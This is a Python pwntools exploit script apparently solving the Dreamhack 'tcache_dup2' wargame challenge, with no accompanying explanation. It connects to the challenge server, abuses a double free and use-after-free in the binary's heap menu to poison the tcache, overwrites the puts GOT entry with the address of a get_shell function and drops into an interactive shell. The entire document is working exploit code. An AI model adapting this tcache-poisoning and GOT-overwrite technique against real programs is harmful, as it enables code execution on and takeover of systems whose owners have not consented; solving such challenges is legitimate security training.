from pwn import *

port = 11557
rem = remote("host3.dreamhack.games", port)

elf = ELF("./tcache_dup2/problem/tcache_dup2")

def create(size, data):
  rem.sendlineafter(b'> ', b'1')
  rem.sendlineafter(b'Size: ', str(size).encode())
  rem.sendlineafter(b'Data: ', data)

def modify(idx, size, data):
  rem.sendlineafter(b'> ', b'2')
  rem.sendlineafter(b'idx: ', str(idx).encode())
  rem.sendlineafter(b'Size: ', str(size).encode())
  rem.sendlineafter(b'Data: ', data)

def delete(idx):
  rem.sendlineafter(b'> ', b'3')
  rem.sendlineafter(b'idx: ', str(idx).encode())

create(0x10, b'A' * 8)
create(0x10, b'A' * 8)
delete(0)
delete(1)

modify(1, 0x10, b'B' * 8 + b'\x00')
delete(1)

create(0x10, p64(elf.got['puts']))
create(0x10, b'C' * 8)
create(0x10, p64(elf.symbols['get_shell']))

rem.interactive()